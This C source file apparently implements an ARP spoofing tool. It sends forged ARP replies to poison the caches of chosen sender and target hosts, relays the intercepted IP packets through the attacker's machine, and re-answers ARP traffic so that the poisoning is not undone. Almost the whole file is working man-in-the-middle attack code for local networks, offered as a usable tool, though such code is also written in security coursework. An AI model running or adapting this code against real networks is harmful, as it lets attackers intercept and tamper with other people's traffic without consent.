#include "arp_spoof.h"

u_char relay[10000];

void usage() {
  printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
  printf("example: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
  printf("maximum session : 10\n");
  return;
}

void print_IP(uint8_t* ip) {
  printf("%d.%d.%d.%d\n\n", ip[0], ip[1], ip[2], ip[3]);
  return;
}

void print_mac(uint8_t* mac) {
  printf("%02x:%02x:%02x:%02x:%02x:%02x\n\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return;
}

void parse_IP(char* ip, uint8_t* out) {
  out[0] = (uint8_t)atoi(strtok(ip, "."));
  for(int i = 1; i < 4; i++) {
    out[i] = (uint8_t)atoi(strtok(NULL, "."));
  }
  return;
}

int get_attacker_IP(const char* ifr, uint8_t* out) { 
  int sockfd;
  struct ifreq ifrq;
  struct sockaddr_in* sin;
  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  strcpy(ifrq.ifr_name, ifr);
  if(ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {
      perror( "ioctl() SIOCGIFADDR error");
      return -1;
  }
  sin = (struct sockaddr_in *)&ifrq.ifr_addr;
  memcpy (out, (void*)&sin->sin_addr, sizeof(sin->sin_addr));

  close(sockfd);

  return 4;
}  

int get_attacker_mac(char* device, uint8_t* out) {
  char errbuf[PCAP_ERRBUF_SIZE];

  int s = socket(AF_INET, SOCK_DGRAM, 0);
  if(s < 0) {
    perror("soccket fail");
    return -1;
  }

  struct ifreq ifr;
  strncpy(ifr.ifr_name, device, IFNAMSIZ);

  if(ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
    perror("ioctl fail");
    return -1;
  }

  memcpy(out, (uint8_t*)ifr.ifr_hwaddr.sa_data, sizeof(ifr.ifr_hwaddr.sa_data));
  close(s);

  return 0;
}

void send_arp(pcap_t* handle, uint16_t packet_type, uint8_t* src_ip, uint8_t* dest_ip, uint8_t* src_mac, uint8_t* dest_mac) {
  packet pk;
  
  memcpy(pk.dest_mac, dest_mac, 6);
  if(packet_type == REPLY) {
    memcpy(pk.dest_mac2, dest_mac, 6);
  }
  else if(packet_type == REQUEST) {
    memcpy(pk.dest_mac2, "\x00", 6);
  }

  memcpy(pk.src_mac, src_mac, 6);
  memcpy(pk.src_mac2, src_mac, 6);
  memcpy(pk.src_ip, src_ip, 4);
  memcpy(pk.dest_ip, dest_ip, 4);

  pk.type = htons(0x0806);
  pk.hw_type = htons(0x0001);
  pk.protocol_type = htons(0x0800);
  pk.hw_size = 0x06;
  pk.protocol_size = 0x04;
  pk.opcode = htons(packet_type);

  u_char packet[42];
  memcpy(packet, &pk, 42);
  if (pcap_sendpacket(handle, packet, 42) != 0) {
    fprintf(stderr, "packet send error");
    return;
  }
  return;
}

int get_mac_by_ip(pcap_t* handle, uint8_t* sender_ip, uint8_t* sender_mac) {
  struct pcap_pkthdr* header;
  const u_char* packet;
  int res = pcap_next_ex(handle, &header, &packet);
  if (res == -1 || res == -2) return -1;
  if(!memcmp(packet+26, sender_ip, 4)) {
    memcpy(sender_mac, packet+6, 6);
    return 0;
  }
  return -1;
}

void relay_ip_packet(const u_char* packet, uint8_t* my_ip, uint8_t* my_mac, uint8_t* src_mac, uint8_t* dest_mac, pcap_t* handle, int length) {
/*
  struct pcap_pkthdr* header;
  const u_char* packet;
  int res = pcap_next_ex(handle, &header, &packet);
  if (res == -1 || res == -2) return;
*/
  if(packet[12] == 0x08 && packet[13] == 0x00) {
    if(memcmp(packet+38, my_ip, 4)) {
      if(!memcmp(packet+6, src_mac, 6)){
        memcpy(relay, packet, length);
        memcpy(relay+6, my_mac, 6);
        memcpy(relay, dest_mac, 6);
      }
      pcap_sendpacket(handle, relay, length);
    }
  }
  memset(relay, 0x00, sizeof(relay));
  return;
}

void prevent_arp_recovery(const u_char* packet, uint8_t* my_ip, uint8_t* src_mac, pcap_t* handle, int length) {
  if(packet[12] == 0x08 && packet[13] == 0x06) {
    if(memcmp(packet+38, my_ip, 4)) {
      if(!memcmp(packet+6, src_mac, 6)) {
        memcpy(relay, packet, length);
        swap_ranges(relay, relay+6, relay+6);
        swap_ranges(relay+22, relay+28, relay+32);
        swap_ranges(relay+28, relay+32, relay+38);
        relay[20] = 0x00;
        relay[21] = 0x02;
        pcap_sendpacket(handle, relay, length);
      }
    }
  }
  memset(relay, 0x00, sizeof(relay));
  return;
}

